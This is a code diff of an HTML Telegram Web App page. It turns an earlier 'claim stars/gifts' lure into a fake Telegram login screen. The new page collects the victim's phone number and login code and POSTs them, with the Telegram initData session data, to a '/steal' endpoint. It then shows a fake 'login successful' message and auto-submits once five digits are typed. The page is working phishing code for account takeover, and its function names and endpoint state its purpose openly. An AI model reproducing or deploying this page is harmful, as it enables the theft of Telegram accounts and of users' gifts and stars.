@@ -1,68 +1,163 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fragment</title>
+    <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin: 0; padding: 20px; background: #1a1a1a; color: white; font-family: Arial; }
-        .btn { background: #8774e1; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; width: 200px; cursor: pointer; }
-        .btn:disabled { opacity: 0.5; }
-        #loading, #success { display: none; text-align: center; margin: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #1e1e1e; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        
+        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
+        
+        .header { text-align: center; margin-bottom: 40px; }
+        .logo { font-size: 48px; margin-bottom: 10px; }
+        
+        .phone-input, .code-input { 
+            background: #2b2b2b; 
+            border: 1px solid #444; 
+            border-radius: 12px; 
+            padding: 15px; 
+            margin: 10px 0; 
+            color: white; 
+            font-size: 16px;
+            width: 100%;
+        }
+        
+        .btn { 
+            background: #8774e1; 
+            color: white; 
+            border: none; 
+            padding: 15px; 
+            border-radius: 12px; 
+            width: 100%; 
+            font-size: 16px;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .monkey {
+            text-align: center;
+            margin: 30px 0;
+            font-size: 80px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .hint {
+            color: #888;
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        #stage-phone, #stage-code { display: none; }
+        #stage-phone.active, #stage-code.active { display: block; }
     </style>
 </head>
 <body>
-    <h2>🔐 Регистрация</h2>
-    
-    <button class="btn" onclick="steal('stars')">⭐ Забрать звезды</button>
-    <button class="btn" onclick="steal('gifts')">🎁 Забрать подарки</button> 
-    <button class="btn" onclick="steal('profile')">👤 Профиль</button>
-    
-    <div id="loading">⏳ Обработка...</div>
-    <div id="success">✅ Успешно!</div>
+    <div class="container">
+        <!-- Этап телефона -->
+        <div id="stage-phone" class="active">
+            <div class="header">
+                <div class="logo">📱</div>
+                <h2>Введите ваш номер</h2>
+                <div class="hint">На него придет код подтверждения</div>
+            </div>
+            
+            <input type="tel" id="phone" class="phone-input" placeholder="+7 123 456-78-90" />
+            <button class="btn" onclick="sendPhone()">Далее</button>
+        </div>
+        
+        <!-- Этап кода -->
+        <div id="stage-code">
+            <div class="header">
+                <div class="monkey">🐵</div>
+                <h2>Введите код</h2>
+                <div class="hint">Код отправлен на ваш телефон</div>
+            </div>
+            
+            <input type="text" id="code" class="code-input" placeholder="12345" maxlength="5" />
+            <button class="btn" onclick="sendCode()">Войти</button>
+        </div>
+    </div>
 
     <script>
-        function steal(type) {
-            // Блокируем кнопки
-            document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
-            document.getElementById('loading').style.display = 'block';
+        let userPhone = '';
+        
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) return;
             
-            // Получаем данные Fragment
-            const tgData = Telegram.WebApp.initData;
-            const user = Telegram.WebApp.initDataUnsafe.user;
+            userPhone = phone;
             
-            // Отправляем на сервер
+            // Переключаем на этап кода
+            document.getElementById('stage-phone').classList.remove('active');
+            document.getElementById('stage-code').classList.add('active');
+            
+            // Симулируем отправку кода
+            setTimeout(() => {
+                // В реальности здесь запрос к твоему серверу
+                fetch('/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stage: 'phone_entered',
+                        phone: phone,
+                        tg_data: Telegram.WebApp.initData
+                    })
+                });
+            }, 500);
+        }
+        
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            if (!code) return;
+            
+            // Отправляем код на сервер
             fetch('/steal', {
-                method: 'POST',
+                method: 'POST', 
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    type: type,
-                    description: getDescription(type),
-                    user_id: user?.id,
-                    username: user?.username,
-                    tg_data: tgData
+                    stage: 'code_entered', 
+                    phone: userPhone,
+                    code: code,
+                    tg_data: Telegram.WebApp.initData
                 })
             });
             
-            // Показываем успех
+            // Показываем загрузку
+            const btn = document.querySelector('#stage-code .btn');
+            btn.textContent = 'Вход...';
+            btn.disabled = true;
+            
+            // Через 2 секунды "успешный вход"
             setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('success').style.display = 'block';
-                
-                // Возвращаем кнопки
-                setTimeout(() => {
-                    document.querySelectorAll('.btn').forEach(btn => btn.disabled = false);
-                    document.getElementById('success').style.display = 'none';
-                }, 2000);
-            }, 1500);
+                // Здесь можно перенаправить или показать успех
+                document.body.innerHTML = `
+                    <div class="container">
+                        <div class="header">
+                            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+                            <h2>Вход выполнен!</h2>
+                            <div class="hint">Аккаунт успешно подключен</div>
+                        </div>
+                    </div>
+                `;
+            }, 2000);
         }
         
-        function getDescription(type) {
-            return {
-                stars: '150 stars',
-                gifts: '5 NFT подарков', 
-                profile: 'данные профиля'
-            }[type];
-        }
+        // Автофокус на инпуты
+        document.getElementById('phone').focus();
+        document.getElementById('code').addEventListener('input', function(e) {
+            if (this.value.length === 5) {
+                sendCode();
+            }
+        });
     </script>
 </body>
 </html>
